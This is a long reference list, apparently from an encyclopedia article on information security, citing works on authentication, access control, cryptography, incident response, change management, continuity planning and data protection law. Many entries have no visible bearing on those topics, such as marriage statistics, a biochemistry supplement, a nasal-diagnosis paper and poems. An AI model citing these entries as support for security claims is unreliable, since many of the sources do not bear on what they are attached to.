^ Lee, Paul (April 2017). "Prints charming: how fingerprints are trailblazing mainstream biometrics". Biometric Technology Today. 2017 (4): 8–11. doi:10.1016/s0969-4765(17)30074-7. ISSN 0969-4765.

^ "Two-Factor Authentication", SpringerReference, Berlin/Heidelberg: Springer-Verlag, 2011, doi:10.1007/springerreference_546, retrieved 2021-06-01

^ "Figure 1.5. Marriage remains the most common form of partnership among couples, 2000-07". dx.doi.org. doi:10.1787/888932392533. Retrieved 2021-06-01.

^ Akpeninor, James Ohwofasa (2013). Modern Concepts of Security. Bloomington, IN: AuthorHouse. p. 135. ISBN 978-1-4817-8232-6. Retrieved 18 January 2018.

^ Richards, G. (April 2012). "One-Time Password (OTP) Pre-Authentication". doi:10.17487/rfc6560. {{cite journal}}: Cite journal requires |journal= (help)

^ Schumacher, Dietmar (2016-04-03). "Surface geochemical exploration after 85 years: What has been accomplished and what more must be done". International Conference and Exhibition, Barcelona, Spain, 3–6 April 2016. SEG Global Meeting Abstracts. Society of Exploration Geophysicists and American Association of Petroleum Geologists: 100. doi:10.1190/ice2016-6522983.1.

^ "Authorization And Approval Program", Internal Controls Policies and Procedures, Hoboken, NJ, USA: John Wiley & Sons, Inc., pp. 69–72, 2015-10-23, doi:10.1002/9781119203964.ch10, ISBN 978-1-119-20396-4, retrieved 2021-06-01

^ "What responses under what conditions?", Local Policies and the European Social Fund, Policy Press, pp. 81–102, 2019-10-02, doi:10.2307/j.ctvqc6hn1.12, ISBN 978-1-4473-4652-4, S2CID 241438707, retrieved 2021-06-01

^ Cheng, Liang; Zhang, Yang; Han, Zhihui (June 2013). "Quantitatively Measure Access Control Mechanisms across Different Operating Systems". 2013 IEEE 7th International Conference on Software Security and Reliability. IEEE: 50–59. doi:10.1109/sere.2013.12. ISBN 978-1-4799-0406-8. S2CID 13261344.

^ a b "discretionary access control", SpringerReference, Berlin/Heidelberg: Springer-Verlag, 2011, doi:10.1007/springerreference_12629, retrieved 2021-06-01

^ "Individual Subunits of the Glutamate Transporter EAAC1 Homotrimer Function Independently of Each Other". dx.doi.org. doi:10.1021/bi050987n.s001. Retrieved 2021-06-01.

^ Ellis Ormrod, Jeanne (2012). Essentials of educational psychology : big ideas to guide effective teaching. Pearson. ISBN 978-0-13-136727-2. OCLC 663953375.

^ Belim, S. V.; Bogachenko, N. F.; Kabanov, A. N. (November 2018). "Severity Level of Permissions in Role-Based Access Control". 2018 Dynamics of Systems, Mechanisms and Machines (Dynamics). IEEE: 1–5. arXiv:1812.11404. doi:10.1109/dynamics.2018.8601460. ISBN 978-1-5386-5941-0. S2CID 57189531.

^ "Configuring TACACS and Extended TACACS", Securing and Controlling Cisco Routers, Auerbach Publications, 2002-05-15, doi:10.1201/9781420031454.ch11, ISBN 978-0-8493-1290-8, retrieved 2021-06-01

^ "Developing Effective Security Policies", Risk Analysis and Security Countermeasure Selection, CRC Press, pp. 261–274, 2009-12-18, doi:10.1201/9781420078718-18, ISBN 978-0-429-24979-2, retrieved 2021-06-01

^ "The Use of Audit Trails to Monitor Key Networks and Systems Should Remain Part of the Computer Security Material Weakness". www.treasury.gov. Retrieved 2017-10-06.

^ "fixing-canadas-access-to-medicines-regime-what-you-need-to-know-about-bill-c398". Human Rights Documents online. doi:10.1163/2210-7975_hrd-9902-0152. Retrieved 2021-06-01.

^ Salazar, Mary K. (January 2006). "Dealing with Uncertain Risks—When to Apply the Precautionary Principle". AAOHN Journal. 54 (1): 11–13. doi:10.1177/216507990605400102. ISSN 0891-0162. S2CID 87769508.

^ "We Need to Know More About How the Government Censors Its Employees". Human Rights Documents Online. doi:10.1163/2210-7975_hrd-9970-2016117. Retrieved 2021-06-01.

^ Pournelle, Jerry (2004-04-22), "1001 Computer Words You Need to Know", Oxford University Press, doi:10.1093/oso/9780195167757.003.0007, ISBN 978-0-19-516775-7, retrieved 2021-07-30 {{citation}}: Missing or empty |title= (help)

^ Easttom, William (2021), "Elliptic Curve Cryptography", Modern Cryptography, Cham: Springer International Publishing, pp. 245–256, doi:10.1007/978-3-030-63115-4_11, ISBN 978-3-030-63114-7, S2CID 234106555, retrieved 2021-06-01

^ Follman, Rebecca (2014-03-01). From Someone Who Has Been There: Information Seeking in Mentoring. IConference 2014 Proceedings (Thesis). iSchools. doi:10.9776/14322. hdl:1903/14292. ISBN 978-0-9884900-1-7.

^ Weiss, Jason (2004), "Message Digests, Message Authentication Codes, and Digital Signatures", Java Cryptography Extensions, Elsevier, pp. 101–118, doi:10.1016/b978-012742751-5/50012-8, ISBN 978-0-12-742751-5, retrieved 2021-06-05

^ Bider, D. (March 2018). "Use of RSA Keys with SHA-256 and SHA-512 in the Secure Shell (SSH) Protocol". doi:10.17487/rfc8332. {{cite journal}}: Cite journal requires |journal= (help)

^ Noh, Jaewon; Kim, Jeehyeong; Kwon, Giwon; Cho, Sunghyun (October 2016). "Secure key exchange scheme for WPA/WPA2-PSK using public key cryptography". 2016 IEEE International Conference on Consumer Electronics-Asia (ICCE-Asia). IEEE: 1–4. doi:10.1109/icce-asia.2016.7804782. ISBN 978-1-5090-2743-9. S2CID 10595698.

^ Van Buren, Roy F. (May 1990). "How you can use the data encryption standard to encrypt your files and data bases". ACM SIGSAC Review. 8 (2): 33–39. doi:10.1145/101126.101130. ISSN 0277-920X.

^ Bonneau, Joseph (2016), "Why Buy When You Can Rent?", Financial Cryptography and Data Security, Lecture Notes in Computer Science, Berlin, Heidelberg: Springer Berlin Heidelberg, vol. 9604, pp. 19–26, doi:10.1007/978-3-662-53357-4_2, ISBN 978-3-662-53356-7, retrieved 2021-06-05

^ Coleman, Heather; Andron, Jeff (2015-08-01), "What GIS Experts and Policy Professionals Need to Know about Using Marxan in Multiobjective Planning Processes", Ocean Solutions, Earth Solutions, Esri Press, doi:10.17128/9781589483651_2, ISBN 978-1-58948-365-1, retrieved 2021-06-05

^ a b "Key Encryption Key", SpringerReference, Berlin/Heidelberg: Springer-Verlag, 2011, doi:10.1007/springerreference_323, retrieved 2021-06-05

^ Giri, Debasis; Barua, Prithayan; Srivastava, P. D.; Jana, Biswapati (2010), "A Cryptosystem for Encryption and Decryption of Long Confidential Messages", Communications in Computer and Information Science, Berlin, Heidelberg: Springer Berlin Heidelberg, vol. 76, pp. 86–96, Bibcode:2010isa..conf...86G, doi:10.1007/978-3-642-13365-7_9, ISBN 978-3-642-13364-0, retrieved 2021-06-05

^ "Video from SPIE - the International Society for Optics and Photonics". dx.doi.org. doi:10.1117/12.2266326.5459349132001. Retrieved 2021-06-05.

^ Vallabhaneni, S.R. (2008). Corporate Management, Governance, and Ethics Best Practices. John Wiley & Sons. p. 288. ISBN 9780470255803.

^ Shon Harris (2003). All-in-one CISSP Certification Exam Guide (2nd ed.). Emeryville, California: McGraw-Hill/Osborne. ISBN 978-0-07-222966-0.

^ Boncardo, Robert (2018-09-20). "Jean-Claude Milner's Mallarmé: Nothing Has Taken Place". Edinburgh University Press. 1. doi:10.3366/edinburgh/9781474429528.003.0005. S2CID 172045429.

^ "The Importance of Operational Due Diligence", Hedge Fund Operational Due Diligence, Hoboken, NJ, USA: John Wiley & Sons, Inc., pp. 49–67, 2015-10-16, doi:10.1002/9781119197485.ch2, ISBN 978-1-119-19748-5, retrieved 2021-06-05

^ Hall, Gaylord C. (March 1917). "Some Important Diagnostic Points the General Practioner [sic] Should Know About the Nose". Southern Medical Journal. 10 (3): 211. doi:10.1097/00007611-191703000-00007. ISSN 0038-4348.

^ Renes, J. (1999). Landschappen van Maas en Peel: een toegepast historisch-geografisch onderzoek in het streekplangebied Noord- en Midden-Limburg. Eisma. ISBN 90-74252-84-2. OCLC 782897414.

^ Thomas, Brook (2017-06-22). "Minding Previous Steps Taken". Oxford Scholarship Online. doi:10.1093/acprof:oso/9780190456368.003.0002. ISBN 978-0-19-045639-9.

^ Lundgren, Regina E. (2018). Risk communication : a handbook for communicating environmental, safety, and health risks. ISBN 978-1-119-45613-1. OCLC 1043389392.

^ Jensen, Eric Talbot (2020-12-03), "Due Diligence in Cyber Activities", Due Diligence in the International Legal Order, Oxford University Press, pp. 252–270, doi:10.1093/oso/9780198869900.003.0015, ISBN 978-0-19-886990-0, retrieved 2021-06-05

^ "The Duty of Care Risk Analysis Standard". DoCRA. Archived from the original on 2018-08-14. Retrieved 2018-08-15.

^ Sutton, Adam; Cherney, Adrian; White, Rob (2008), "Evaluating crime prevention", Crime Prevention, Cambridge: Cambridge University Press, pp. 70–90, doi:10.1017/cbo9780511804601.006, ISBN 978-0-511-80460-1, retrieved 2021-06-05

^ Check, Erika (2004-09-15). "FDA considers antidepressant risks for kids". Nature. doi:10.1038/news040913-15. ISSN 0028-0836.

^ Auckland, Cressida (2017-08-16). "Protecting me from my Directive: Ensuring Appropriate Safeguards for Advance Directives in Dementia". Medical Law Review. 26 (1): 73–97. doi:10.1093/medlaw/fwx037. ISSN 0967-0742. PMID 28981694.

^ Takach, George S. (2016), "Preparing for Breach Litigation", Data Breach Preparation and Response, Elsevier, pp. 217–230, doi:10.1016/b978-0-12-803451-4.00009-5, ISBN 978-0-12-803451-4, retrieved 2021-06-05

^ Westby, J.R.; Allen, J.H. (August 2007). "Governing for Enterprise Security (GES) Implementation Guide" (PDF). Software Engineering Institute. Retrieved 25 January 2018.

^ Fowler, Kevvie (2016), "Developing a Computer Security Incident Response Plan", Data Breach Preparation and Response, Elsevier, pp. 49–77, doi:10.1016/b978-0-12-803451-4.00003-4, ISBN 978-0-12-803451-4, retrieved 2021-06-05

^ Bisogni, Fabio (2016). "Proving Limits of State Data Breach Notification Laws: Is a Federal Law the Most Adequate Solution?". Journal of Information Policy. 6: 154–205. doi:10.5325/jinfopoli.6.2016.0154. JSTOR 10.5325/jinfopoli.6.2016.0154.

^ "Understanding Plan for Every Part", Turbo Flow, Productivity Press, pp. 21–30, 2017-07-27, doi:10.1201/b10336-5, ISBN 978-0-429-24603-6, retrieved 2021-06-05

^ a b Wills, Leonard (27 February 2019). "A Brief Guide to Handling a Cyber Incident". American Bar Association.

^ Johnson, Leighton R. (2014), "Part 1. Incident Response Team", Computer Incident Response and Forensics Team Management, Elsevier, pp. 17–19, doi:10.1016/b978-1-59749-996-5.00038-8, ISBN 978-1-59749-996-5, retrieved 2021-06-05

^ "Computer Incident Response and Forensics Team Management". Network Security. 2014 (2): 4. February 2014. doi:10.1016/s1353-4858(14)70018-2. ISSN 1353-4858.

^ "Cybersecurity Threat Landscape and Future Trends", Cybersecurity, Routledge, pp. 304–343, 2015-04-16, doi:10.1201/b18335-12, ISBN 978-0-429-25639-4, retrieved 2021-06-05

^ Information technology. Security techniques. Information security incident management, BSI British Standards, doi:10.3403/30268878u, retrieved 2021-06-05

^ "Investigation of a Flow Step Clogging Incident: A Precautionary Note on the Use of THF in Commercial-Scale Continuous Process". dx.doi.org. doi:10.1021/acs.oprd.9b00366.s001. Retrieved 2021-06-05.

^ Turner, Tim (2011-09-07), "Our Beginning: Team Members Who Began the Success Story", One Team on All Levels, Productivity Press, pp. 9–36, doi:10.4324/9781466500020-2, ISBN 978-0-429-25314-0, retrieved 2021-06-05

^ Erlanger, Leon (2002). Defensive Strategies. PC Magazine. p. 70.

^ "of Belgrade's main street. The event took place in absolute", Radical Street Performance, Routledge, pp. 81–83, 2013-11-05, doi:10.4324/9781315005140-28, ISBN 978-1-315-00514-0, retrieved 2021-06-05

^ "Why Choice Matters So Much and What Can be Done to Preserve It". The Manipulation of Choice. Palgrave Macmillan. 2013. doi:10.1057/9781137313577.0010. ISBN 978-1-137-31357-7. Retrieved 2021-06-05.

^ a b c "Computer Security Incident Handling Guide" (PDF). Nist.gov. 2012.

^ Borgström, Pernilla; Strengbom, Joachim; Viketoft, Maria; Bommarco, Riccardo (4 April 2016). "Table S3: Results from linear-mixed models where non-signficant [sic] parameters have not been removed". PeerJ. 4: e1867. doi:10.7717/peerj.1867/supp-3. Retrieved 2021-06-05.

^ Penfold, David (2000), "Selecting, Copying, Moving and Deleting Files and Directories", ECDL Module 2: Using the Computer and Managing Files, London: Springer London, pp. 86–94, doi:10.1007/978-1-4471-0491-9_6, ISBN 978-1-85233-443-7, retrieved 2021-06-05

^ Gumus, Onur (2018). ASP. NET Core 2 Fundamentals : Build Cross-Platform Apps and Dynamic Web Services with This Server-side Web Application Framework. Packt Publishing Ltd. ISBN 978-1-78953-355-2. OCLC 1051139482.

^ "Do the Students Understand What They Are Learning?", Trouble-shooting Your Teaching, Routledge, pp. 36–40, 2005-02-25, doi:10.4324/9780203416907-8, ISBN 978-0-203-41690-7, retrieved 2021-06-05

^ "Where Are Films Restored, Where Do They Come From and Who Restores Them?", Film Restoration, Palgrave Macmillan, 2013, doi:10.1057/9781137328724.0006, ISBN 978-1-137-32872-4, retrieved 2021-06-05

^ Liao, Qi; Li, Zhen; Striegel, Aaron (2011-01-24). "Could firewall rules be public - a game theoretical perspective". Security and Communication Networks. 5 (2): 197–210. doi:10.1002/sec.307. ISSN 1939-0114.

^ Boeckman, Philip; Greenwald, David J.; Von Bismarck, Nilufer (2013). Twelfth annual institute on securities regulation in Europe : overcoming deal-making challenges in the current markets. Practising Law Institute. ISBN 978-1-4024-1932-4. OCLC 825824220.

^ "Figure 1.8. Spending of social security has been growing, while self-financing has been falling". dx.doi.org. doi:10.1787/888932459242. Retrieved 2021-06-05.

^ "Information Governance: The Crucial First Step", Safeguarding Critical E-Documents, Hoboken, NJ, USA: John Wiley & Sons, Inc., pp. 13–24, 2015-09-19, doi:10.1002/9781119204909.ch2, ISBN 978-1-119-20490-9, retrieved 2021-06-05

^ He, Ying (December 1, 2017). "Challenges of Information Security Incident Learning: An Industrial Case Study in a Chinese Healthcare Organization" (PDF). Informatics for Health and Social Care. 42 (4): 394–395. doi:10.1080/17538157.2016.1255629. PMID 28068150. S2CID 20139345.

^ Kampfner, Roberto R. (1985). "Formal specification of information systems requirements". Information Processing & Management. 21 (5): 401–414. doi:10.1016/0306-4573(85)90086-x. ISSN 0306-4573.

^ Jenner, H.A. (1995). Assessment of ecotoxicological risks of element leaching from pulverized coal ashes. s.n.] OCLC 905474381.

^ "Desktop Computers: Software", Practical Pathology Informatics, New York: Springer-Verlag, pp. 51–82, 2006, doi:10.1007/0-387-28058-8_3, ISBN 0-387-28057-X, retrieved 2021-06-05

^ Wilby, R.L.; Orr, H.G.; Hedger, M.; Forrow, D.; Blackmore, M. (December 2006). "Risks posed by climate change to the delivery of Water Framework Directive objectives in the UK". Environment International. 32 (8): 1043–1055. doi:10.1016/j.envint.2006.06.017. ISSN 0160-4120. PMID 16857260.

^ Campbell, T. (2016). "Chapter 14: Secure Systems Development". Practical Information Security Management: A Complete Guide to Planning and Implementation. Apress. p. 218. ISBN 9781484216859.

^ L., Koppelman, Kent (2011). Understanding human differences : multicultural education for a diverse America. Pearson/Allyn & Bacon. OCLC 1245910610.

^ "POST-PROCESSING", Simple Scene, Sensational Shot, Routledge, pp. 128–147, 2013-04-12, doi:10.4324/9780240821351-9, ISBN 978-0-240-82135-1, retrieved 2021-06-05

^ Kumar, Binay; Mahto, Tulsi; Kumari, Vinita; Ravi, Binod Kumar; Deepmala (2016). "Quackery: How It Can Prove Fatal Even in Apparently Simple Cases-A Case Report". Medico-Legal Update. 16 (2): 75. doi:10.5958/0974-1283.2016.00063.3. ISSN 0971-720X.

^ Priest, Sally (2019-02-22). "Shared roles and responsibilities in flood risk management". Journal of Flood Risk Management. 12 (1): e12528. doi:10.1111/jfr3.12528. ISSN 1753-318X. S2CID 133789858.

^ United States. Department of Energy. Office of Inspector General. Office of Scientific and Technical Information (2009). Audit Report, "Fire Protection Deficiencies at Los Alamos National Laboratory.". United States. Dept. of Energy. OCLC 727225166.

^ Toms, Elaine G. (January 1992). "Managing change in libraries and information services; A systems approach". Information Processing & Management. 28 (2): 281–282. doi:10.1016/0306-4573(92)90052-2. ISSN 0306-4573.

^ Abolhassan, Ferri (2003), "The Change Management Process Implemented at IDS Scheer", Business Process Change Management, Berlin, Heidelberg: Springer Berlin Heidelberg, pp. 15–22, doi:10.1007/978-3-540-24703-6_2, ISBN 978-3-642-05532-4, retrieved 2021-06-05

^ Dawson, Chris (2020-07-01). Leading Culture Change. doi:10.1515/9780804774673. ISBN 9780804774673. S2CID 242348822.

^ McCormick, Douglas P. (22 March 2016). Family Inc. : using business principles to maximize your family's wealth. ISBN 978-1-119-21976-7. OCLC 945632737.

^ Schuler, Rainer (August 1995). "Some properties of sets tractable under every polynomial-time computable distribution". Information Processing Letters. 55 (4): 179–184. doi:10.1016/0020-0190(95)00108-o. ISSN 0020-0190.

^ "Figure 12.2. Share of own-account workers who generally do not have more than one client" (Excel). dx.doi.org. doi:10.1787/888933881610. Retrieved 2021-06-05.

^ "Multi-user file server for DOS LANs". Computer Communications. 10 (3): 153. June 1987. doi:10.1016/0140-3664(87)90353-7. ISSN 0140-3664.

^ "Defining Organizational Change", Organizational Change, Oxford, UK: Wiley-Blackwell, pp. 21–51, 2011-04-19, doi:10.1002/9781444340372.ch1, ISBN 978-1-4443-4037-2, retrieved 2021-06-05

^ Kirchmer, Mathias; Scheer, August-Wilhelm (2003), "Change Management — Key for Business Process Excellence", Business Process Change Management, Berlin, Heidelberg: Springer Berlin Heidelberg, pp. 1–14, doi:10.1007/978-3-540-24703-6_1, ISBN 978-3-642-05532-4, retrieved 2021-06-05

^ More, Josh; Stieber, Anthony J.; Liu, Chris (2016), "Tier 2—Advanced Help Desk—Help Desk Supervisor", Breaking Into Information Security, Elsevier, pp. 111–113, doi:10.1016/b978-0-12-800783-9.00029-x, ISBN 978-0-12-800783-9, retrieved 2021-06-05

^ "An Application of Bayesian Networks in Automated Scoring of Computerized Simulation Tasks", Automated Scoring of Complex Tasks in Computer-Based Testing, Routledge, pp. 212–264, 2006-04-04, doi:10.4324/9780415963572-10, ISBN 978-0-415-96357-2, retrieved 2021-06-05

^ Kavanagh, Michael J. (June 1994). "Change, Change, Change". Group & Organization Management. 19 (2): 139–140. doi:10.1177/1059601194192001. ISSN 1059-6011. S2CID 144169263.

^ Taylor, J. (2008). "Chapter 10: Understanding the Project Change Process". Project Scheduling and Cost Control: Planning, Monitoring and Controlling the Baseline. J. Ross Publishing. pp. 187–214. ISBN 9781932159110.

^ "17. Innovation and Change: Can Anyone Do This?", Backstage in a Bureaucracy, University of Hawaii Press, pp. 87–96, 2017-12-31, doi:10.1515/9780824860936-019, ISBN 978-0-8248-6093-6, retrieved 2021-06-05

^ Braun, Adam (3 February 2015). Promise of a pencil : how an ordinary person can create extraordinary change. ISBN 978-1-4767-3063-9. OCLC 902912775.

^ "Describing Within-Person Change Over Time", Longitudinal Analysis, Routledge, pp. 235–306, 2015-01-30, doi:10.4324/9781315744094-14, ISBN 978-1-315-74409-4, retrieved 2021-06-05

^ Ingraham, Carolyn; Ban, Patricia W. (1984). Legislating bureaucratic change : the Civil Service Reform Act of 1978. State University of New York Press. ISBN 0-87395-886-1. OCLC 10300171.

^ Wei, J. (2000-05-04). "Preliminary Change Request for the SNS 1.3 GeV-Compatible Ring". doi:10.2172/1157253. OSTI 1157253. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ Chen Liang (May 2011). "Allocation priority management of agricultural water resources based on the theory of virtual water". 2011 International Conference on Business Management and Electronic Information. IEEE. 1: 644–647. doi:10.1109/icbmei.2011.5917018. ISBN 978-1-61284-108-3. S2CID 29137725.

^ "Change risks and best practices in Business Change Management Unmanaged change risk leads to problems for change management", Leading and Implementing Business Change Management, Routledge, pp. 32–74, 2013-07-18, doi:10.4324/9780203073957-9, ISBN 978-0-203-07395-7, retrieved 2021-06-05

^ Bragg, Steven M. (2016). Accounting Best Practices. Wiley. ISBN 978-1-118-41780-5. OCLC 946625204.

^ "Successful change requires more than change management". Human Resource Management International Digest. 16 (7). 2008-10-17. doi:10.1108/hrmid.2008.04416gad.005. ISSN 0967-0734.

^ "Planning for water resources under climate change", Spatial Planning and Climate Change, Routledge, pp. 287–313, 2010-09-13, doi:10.4324/9780203846537-20, ISBN 978-0-203-84653-7, retrieved 2021-06-05

^ Rowan, John (January 1967). "Answering the computer back". Management Decision. 1 (1): 51–54. doi:10.1108/eb000776. ISSN 0025-1747.

^ Biswas, Margaret R.; Biswas, Asit K. (February 1981). "Climatic change and food production". Agriculture and Environment. 5 (4): 332. doi:10.1016/0304-1131(81)90050-3. ISSN 0304-1131.

^ "backout", SpringerReference, Berlin/Heidelberg: Springer-Verlag, 2011, doi:10.1007/springerreference_8663, retrieved 2021-06-05

^ "Editorial Advisory and Review Board", Business and Sustainability: Concepts, Strategies and Changes, Critical Studies on Corporate Responsibility, Governance and Sustainability, Emerald Group Publishing Limited, vol. 3, pp. xv–xvii, 2011-12-06, doi:10.1108/s2043-9059(2011)0000003005, ISBN 978-1-78052-438-2, retrieved 2021-06-05

^ "Where a Mirage Has Once Been, Life Must Be", New and Selected Poems, University of South Carolina Press, p. 103, 2014, doi:10.2307/j.ctv6sj8d1.65, ISBN 978-1-61117-323-9, retrieved 2021-06-05

^ Bell, Marvin (1983). "Two, When There Might Have Been Three". The Antioch Review. 41 (2): 209. doi:10.2307/4611230. JSTOR 4611230.

^ "We can also make change". Human Rights Documents Online. doi:10.1163/2210-7975_hrd-0148-2015175. Retrieved 2021-06-05.

^ Mazikana, Anthony Tapiwa (5 November 2020). "'Change Is the Law of Life. and Those Who Look only to the past or Present Are Certain to Miss the Future- John F. Kennedy' Assessing This Statement with References to Organizations in Zimbabwe Who Have Been Affected by Change". doi:10.2139/ssrn.3725707. S2CID 238964905. {{cite journal}}: Cite journal requires |journal= (help)

^ Ramanadham, V. V. (ed.). Privatisation in the UK. ISBN 978-0-429-19973-8. OCLC 1085890184.

^ "More complex/realistic rheology must be implemented; Numerical convergence tests must be performed". dx.doi.org. 2020-09-22. doi:10.5194/gmd-2020-107-rc2. S2CID 241597573. Retrieved 2021-06-05.

^ Stone, Edward. Edward C. Stone Collection. OCLC 733102101.

^ Lientz, B (2002), "Develop Your Improvement Implementation Plan", Achieve Lasting Process Improvement, Elsevier, pp. 151–171, doi:10.1016/b978-0-12-449984-3.50011-8, ISBN 978-0-12-449984-3, retrieved 2021-06-05

^ Smeets, Peter (2009). Expeditie agroparken : ontwerpend onderzoek naar metropolitane landbouw en duurzame ontwikkeling. s.n.] ISBN 978-90-8585-515-6. OCLC 441821141.

^ "Figure 1.3. About 50 percent of the Going for Growth recommendations have been implemented or are in process of implementation". dx.doi.org. doi:10.1787/888933323735. Retrieved 2021-06-05.

^ Kekes, John (2019-02-21), "Must Justice Be Done at All Costs?", Hard Questions, Oxford University Press, pp. 98–126, doi:10.1093/oso/9780190919986.003.0005, ISBN 978-0-19-091998-6, retrieved 2021-06-05

^ Forrester, Kellie (2014). Macroeconomic implications of changes in the composition of the labor force. ISBN 978-1-321-34938-2. OCLC 974418780.

^ Choudhury, Gagan L.; Rappaport, Stephen S. (October 1981). "Demand assigned multiple access systems using collision type request channels". ACM SIGCOMM Computer Communication Review. 11 (4): 136–148. doi:10.1145/1013879.802667. ISSN 0146-4833.

^ Crinson, Mark (2013). ""Certain Old and Lovely Things, Whose Signified Is Abstract, Out of Date": James Stirling and Nostalgia". Change over Time. 3 (1): 116–135. doi:10.1353/cot.2013.0000. ISSN 2153-0548.

^ Ahwidy, Mansour; Pemberton, Lyn (2016). "What Changes Need to be Made within the LNHS for Ehealth Systems to be Successfully Implemented?". Proceedings of the International Conference on Information and Communication Technologies for Ageing Well and e-Health. Scitepress: 71–79. doi:10.5220/0005620400710079. ISBN 978-989-758-180-9.

^ Mortimer, John (April 2010). Paradise postponed. ISBN 978-0-14-104952-6. OCLC 495596392.

^ a b Soriani, Marco (2021-04-08). "Faculty Opinions recommendation of Concerns about SARS-CoV-2 evolution should not hold back efforts to expand vaccination". Nature Reviews. Immunology. 21 (5). doi:10.3410/f.739855011.793584529. S2CID 242286470. Retrieved 2021-06-05.

^ Frampton, Michael (2014-12-26), "Processing Data with Map Reduce", Big Data Made Easy, Berkeley, CA: Apress, pp. 85–120, doi:10.1007/978-1-4842-0094-0_4, ISBN 978-1-4842-0095-7, retrieved 2021-06-05

^ "Good study overall, but several procedures need fixing" (PDF). 2016-02-23. doi:10.5194/hess-2015-520-rc2. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ Harrison, Kent; Craft, Walter M.; Hiller, Jack; McCluskey, Michael R. (July 1996). "Peer Review Coordinating Draft. Task Analysis for Conduct Intelligence Planning (Critical Combat Function 1): As Accomplished by a Battalion Task Force". DTIC ADA313949. {{cite journal}}: Cite journal requires |journal= (help)

^ itpi.org Archived December 10, 2013, at the Wayback Machine

^ "book summary of The Visible Ops Handbook: Implementing ITIL in 4 Practical and Auditable Steps". wikisummaries.org. Retrieved 2016-06-22.

^ Bigelow, Michelle (2020-09-23), "Change Control and Change Management", Implementing Information Security in Healthcare, HIMSS Publishing, pp. 203–214, doi:10.4324/9781003126294-17, ISBN 978-1-003-12629-4, S2CID 224866307, retrieved 2021-06-05

^ Business continuity management. Guidance on organization recovery following disruptive incidents, BSI British Standards, doi:10.3403/30194308, retrieved 2021-06-05

^ Hoanh, Chu Thai (1996). Development of a computerized aid to integrated land use planning (cailup) at regional level in irrigated areas : a case study for the Quan Lo Phung Hiep region in the Mekong Delta, Vietnam. ITC. ISBN 90-6164-120-9. OCLC 906763535.

^ 1Hibberd, Gary (2015-09-11), "Developing a BCM Strategy in Line with Business Strategy", The Definitive Handbook of Business Continuity Management, Hoboken, NJ, USA: John Wiley & Sons, Inc., pp. 23–30, doi:10.1002/9781119205883.ch2, ISBN 978-1-119-20588-3, retrieved 2021-06-05

^ Hotchkiss, Stuart (2010). Business Continuity Management: In Practice. BCS Learning & Development Limited. ISBN 978-1-906124-72-4.[page needed]

^ "Identifying Potential Failure Causes", Systems Failure Analysis, ASM International, pp. 25–33, 2009, doi:10.31399/asm.tb.sfa.t52780025, ISBN 978-1-62708-268-6, retrieved 2021-06-05

^ Clemens, Jeffrey. Risks to the returns to medical innovation : the case of myriad genetics. OCLC 919958196.

^ Goatcher, Genevieve (2013), "Maximum Acceptable Outage", Encyclopedia of Crisis Management, Thousand Oaks, CA: SAGE Publications, Inc., doi:10.4135/9781452275956.n204, ISBN 978-1-4522-2612-5, retrieved 2021-06-05

^ "Segment Design Tradeoffs", Software Radio Architecture, New York, USA: John Wiley & Sons, Inc., pp. 236–243, 2002-01-17, doi:10.1002/047121664x.ch6, ISBN 978-0-471-21664-3, retrieved 2021-06-05

^ Blundell, S. (1998). "IN-EMERGENCY - integrated incident management, emergency healthcare and environmental monitoring in road networks". IEE Seminar Using ITS in Public Transport and in Emergency Services. IEE. 1998: 9. doi:10.1049/ic:19981090.

^ King, Jonathan R. (January 1993). "Contingency Plans and Business Recovery". Information Systems Management. 10 (4): 56–59. doi:10.1080/10580539308906959. ISSN 1058-0530.

^ Phillips, Brenda D.; Landahl, Mark (2021), "Strengthening and testing your business continuity plan", Business Continuity Planning, Elsevier, pp. 131–153, doi:10.1016/b978-0-12-813844-1.00001-4, ISBN 978-0-12-813844-1, S2CID 230582246, retrieved 2021-06-05

^ Schnurr, Stephanie (2009), "The 'Other' Side of Leadership Discourse: Humour and the Performance of Relational Leadership Activities", Leadership Discourse at Work, London: Palgrave Macmillan UK, pp. 42–60, doi:10.1057/9780230594692_3, ISBN 978-1-349-30001-3, retrieved 2021-06-05

^ Specified time relays for industrial use, BSI British Standards, doi:10.3403/02011580u, retrieved 2021-06-05

^ "Sample Generic Plan and Procedure: Disaster Recovery Plan (DRP) for Operations/Data Center". Workplace Violence. Elsevier. 2010. pp. 253–270. doi:10.1016/b978-1-85617-698-9.00025-4. ISBN 978-1-85617-698-9. Retrieved 2021-06-05.

^ "Information Technology Disaster Recovery Plan". Disaster Planning for Libraries. Chandos Information Professional Series. Elsevier. 2015. pp. 187–197. doi:10.1016/b978-1-84334-730-9.00019-3. ISBN 978-1-84334-730-9. Retrieved 2021-06-05.

^ "The Disaster Recovery Plan". Sans Institute. Retrieved 7 February 2012.

^ a b "Figure 1.10. Regulations in non-manufacturing sector have significant impact on the manufacturing sector". dx.doi.org. doi:10.1787/888933323807. Retrieved 2021-06-05.

^ Ahupuaʻa [electronic resource] : World Environmental and Water Resources Congress 2008, May 12-16, 2008, Honolulu, Hawaiʻi. American Society of Civil Engineers. 2008. ISBN 978-0-7844-0976-3. OCLC 233033926.

^ Great Britain. Parliament. House of Commons (2007). Data protection [H.L.] A bill [as amended in standing committee d] intituled an act to make new provision for the regulation of the processing of information relating to individuals, including the obtaining, holding, use or disclosure of such information. Proquest LLC. OCLC 877574826.

^ "Data protection, access to personal information and privacy protection", Government and Information Rights: The Law Relating to Access, Disclosure and their Regulation, Bloomsbury Professional, 2019, doi:10.5040/9781784518998.chapter-002, ISBN 978-1-78451-896-7, S2CID 239376648, retrieved 2021-06-05

^ Lehtonen, Lasse A. (2017-07-05), "Genetic Information and the Data Protection Directive of the European Union", The Data Protection Directive and Medical Research Across Europe, Routledge, pp. 103–112, doi:10.4324/9781315240350-8, ISBN 978-1-315-24035-0, retrieved 2021-06-05

^ "Data Protection Act 1998". legislation.gov.uk. The National Archives. Retrieved 25 January 2018.

^ "Computer Misuse Act 1990", Criminal Law Statutes 2011-2012, Routledge, pp. 114–118, 2013-06-17, doi:10.4324/9780203722763-42, ISBN 978-0-203-72276-3, retrieved 2021-06-05

^ Dharmapala, Dhammika; Hines, James (December 2006). "Which Countries Become Tax Havens?". Cambridge, MA. doi:10.3386/w12802. {{cite journal}}: Cite journal requires |journal= (help)

^ "Figure 1.14. Participation rates have risen but labour force growth has slowed in several countries". dx.doi.org. doi:10.1787/888933367391. Retrieved 2021-06-05.

